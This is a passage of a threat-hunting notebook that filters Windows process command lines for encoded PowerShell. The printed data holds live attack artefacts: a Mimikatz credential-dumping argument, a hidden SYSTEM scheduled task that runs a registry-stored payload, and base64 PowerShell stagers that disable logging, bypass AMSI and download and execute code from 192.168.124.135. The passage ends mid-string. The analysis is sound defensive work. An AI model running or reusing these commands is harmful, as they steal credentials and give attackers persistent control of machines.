              "       '-noninteractive -Sta -encodedCommand CgAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBDAGwAaQBwAGIAbwBhAHIAZABdADoAOgBHAGUAdABUAGUAeAB0ACgAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIAYAByACIALAAgACcAJwAgAC0AcwBwAGwAaQB0ACAAIgBgAG4AIgAgACAACgAgACAAIAAgACAAIAAgACAA -inputFormat xml -outputFormat xml',\n",
              "       '-secured -Embedding', '-k netsvcs -p -s wlidsvc',\n",
              "       '-k WerSvcGroup',\n",
              "       '-k LocalSystemNetworkRestricted -p -s WdiSystemHost',\n",
              "       'Files\\\\WindowsApps\\\\Microsoft.MicrosoftOfficeHub_18.2002.1101.0_x64__8wekyb3d8bbwe\\\\LocalBridge.exe\" /InvokerPRAID: Microsoft.MicrosoftOfficeHub notifications',\n",
              "       '-ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca',\n",
              "       '-ServerName:App.AppXemn3t55segp7q92mwd35v2a5rk5mvwyz.mca',\n",
              "       '-k wsappx -p -s ClipSVC',\n",
              "       '/Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}',\n",
              "       '-ServerName:Windows.Internal.WebRuntime.ContentProcessServer',\n",
              "       'SCODEF:9716 CREDAT:9730 APH:1000000000000006 JITHOST /prefetch:2',\n",
              "       '-ServerName:MicrosoftEdge.AppXdnhjhccw3zf0j06tkg3jtqr00qdm0khc.mca',\n",
              "       'privilege::debug sekurlsa::logonpasswords exit',\n",
              "       '/Create /F /RU system /SC DAILY /ST 09:00 /TN Updater /TR \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NonI -W hidden -c \\\\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\\\\Software\\\\Microsoft\\\\Network debug).debug)))\\\\\"\"',\n",
              "       '-k LocalServiceNetworkRestricted -p -s NgcCtnrSvc',\n",
              "       '-k LocalSystemNetworkRestricted -p -s NgcSvc',\n",
              "       '-RegisterDevice -ProtectionStateChanged -FreeNetworkOnly',\n",
              "       '-NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBTAEUAbQBCAEwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AGUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBsAD0AWwBDAG8AbABsAGUAQwB0AGkAbwBuAHMALgBHAGUATgBFAFIASQBjAC4ARABJAGMAVABJAE8AbgBhAHIAWQBbAFMAVABSAGkAbgBnACwAUwB5AFMAVABFAG0ALgBPAEIAagBlAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUATABTAEUAewBbAFMAQwBSAEkAcAB0AEIATABvAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAVQBlACgAJABOAFUATABMACwAKABOAEUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAGwAbABFAEMAVABpAE8AbgBTAC4ARwBlAG4AZQBSAEkAQwAuAEgAQQBzAEgAUwBFAHQAWwBzAHQAUgBJAE4AZwBdACkAKQB9AFsAUgBlAEYAXQAuAEEAUwBTAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbAB1AEUAKAAkAE4AVQBsAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMAZQBSAFYASQBjAEUAUABvAGkAbgB0AE0AYQBOAEEAZwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAE4AVABpAE4AdQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBtAC4ATgBlAFQALgBXAGUAYgBDAGwAaQBlAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcARQBiAFIAZQBRAHUARQBzAFQAXQA6ADoARABlAGYAQQB1AGwAdABXAEUAQgBQAFIATwB4AHkAOwAkAFcAYwAuAFAAUgBvAFgAeQAuAEMAUgBlAGQAZQBOAFQASQBBAEwAcwAgAD0AIABbAFMAeQBzAFQARQBtAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAGkAQQBMAEMAQQBDAGgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4ARQBUAHcATwBSAEsAQwByAEUAZABFAE4AdABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBOAGMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQAZQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AFMATQBMAFgAVwBRAGIAaQBFADMAWgAvAE4ARABHAHEATAB1ADgAVAA5AEUAdABCAHIARABRAD0AIgApADsAJABEAEEAdABhAD0AJABXAEMALgBEAE8AVwBuAGwAbwBBAEQARABhAFQAQQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQBWAD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABkAEEAdABBAFsANAAuAC4AJABkAEEAVABhAC4AbABFAE4AZwB0AEgAXQA7AC0AagBvAGkAbgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=',\n",
              "       '-NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x',\n",
              "       '10512 324 000001E6D2E90490', '/groups',\n",
              "       '-noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAEUATQBiAEwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATABVAGUAKAAkAG4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABMAGUAQwB0AGkAbwBOAHMALgBHAGUAbgBlAFIASQBDAC4ARABJAEMAVABpAG8AbgBhAHIAWQBbAFMAVAByAGkAbgBnACwAUwB5AFMAVABlAE0ALgBPAGIASgBlAEMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAEUAewBbAFMAYwByAGkAUAB0AEIATABPAGMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABuAFUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAYwBUACAAQwBvAEwAbABFAEMAdABpAE8AbgBzAC4ARwBlAG4AZQBSAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBpAE4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBMAEwALAAkAFQAUgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMAZQByAFYASQBjAEUAUABvAGkAbgB0AE0AQQBOAGEARwBFAFIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AVABpAG4AdQBFAD0AMAA7ACQAdwBDAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAEUAQgBDAGwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAFgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlAGYAYQBVAGwAVABXAGUAQgBQAHIATwB4AFkAOwAkAHcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBuAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgB0AGkAYQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBBAFUAbABUAE4AZQBUAHcAbwByAEsAQwByAGUARABFAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAEUAeABUAC4ARQBuAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQB0AEUAcwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBqAHMAagBkAG0AMABoAE4AagBIAHgAYgBaAEcASABrAGEAeQBpACsAcgBOAFkAYwBKAFYAcwA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABBAHQAQQAuAEwARQBOAGcAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA',\n",
              "       '\"C:\\\\Users\\\\anon\\\\Downloads\\\\quarterly_results.docm.vbs\"',\n",
              "       '-IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe|C:\\\\Users\\\\anon\\\\Downloads\\\\quarterly_results.docm.vbs|http://192.168.124.135/quarterly_results.docm.vbs',\n",
              "       '-k appmodel -p -s camsvc'], dtype=object)"
            ]
          },
          "metadata": {},
          "execution_count": 14
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "dXSlQpx_ej92"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "3. base64?\n"
      ],
      "metadata": {
        "id": "qiiamfiLe9Ih"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import re\n",
        "b64_regex = r\"[a-zA-Z0-9+\\/]{64,}={0,2}\""
      ],
      "metadata": {
        "id": "TDIGUEz-epry"
      },
      "execution_count": 15,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['arguments'][newdf['arguments'].str.contains('enc')]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "m1TdXk1NfFGT",
        "outputId": "262a19bd-8dfd-405b-8836-504dcb3fc951"
      },
      "execution_count": 16,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "873     -noninteractive -Sta -encodedCommand CgAgACAAI...\n",
              "2564    -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBF...\n",
              "2728    -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software...\n",
              "3351    -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAUw...\n",
              "Name: arguments, dtype: object"
            ]
          },
          "metadata": {},
          "execution_count": 16
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for i in newdf['arguments'][newdf['arguments'].apply(lambda x: re.search(b64_regex, x)).notnull()]:\n",
        "    print(i,\"\\n\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fO_ZslgGfPXv",
        "outputId": "ef3a1d50-4aab-43a8-fd86-cf1f358a04a0"
      },
      "execution_count": 17,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "-noninteractive -Sta -encodedCommand CgAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFcAaQBuAGQAbwB3AHMALgBDAGwAaQBwAGIAbwBhAHIAZABdADoAOgBHAGUAdABUAGUAeAB0ACgAKQAgAC0AcgBlAHAAbABhAGMAZQAgACIAYAByACIALAAgACcAJwAgAC0AcwBwAGwAaQB0ACAAIgBgAG4AIgAgACAACgAgACAAIAAgACAAIAAgACAA -inputFormat xml -outputFormat xml \n",
            "\n",
            "-NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBTAEUAbQBCAEwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AGUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBsAD0AWwBDAG8AbABsAGUAQwB0AGkAbwBuAHMALgBHAGUATgBFAFIASQBjAC4ARABJAGMAVABJAE8AbgBhAHIAWQBbAFMAVABSAGkAbgBnACwAUwB5AFMAVABFAG0ALgBPAEIAagBlAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUATABTAEUAewBbAFMAQwBSAEkAcAB0AEIATABvAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAVQBlACgAJABOAFUATABMACwAKABOAEUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAGwAbABFAEMAVABpAE8AbgBTAC4ARwBlAG4AZQBSAEkAQwAuAEgAQQBzAEgAUwBFAHQAWwBzAHQAUgBJAE4AZwBdACkAKQB9AFsAUgBlAEYAXQAuAEEAUwBTAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbAB1AEUAKAAkAE4AVQBsAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMAZQBSAFYASQBjAEUAUABvAGkAbgB0AE0AYQBOAEEAZwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAE4AVABpAE4AdQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBtAC4ATgBlAFQALgBXAGUAYgBDAGwAaQBlAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcARQBiAFIAZQBRAHUARQBzAFQAXQA6ADoARABlAGYAQQB1AGwAdABXAEUAQgBQAFIATwB4AHkAOwAkAFcAYwAuAFAAUgBvAFgAeQAuAEMAUgBlAGQAZQBOAFQASQBBAEwAcwAgAD0AIABbAFMAeQBzAFQARQBtAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAGkAQQBMAEMAQQBDAGgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4ARQBUAHcATwBSAEsAQwByAEUAZABFAE4AdABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBOAGMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcARAA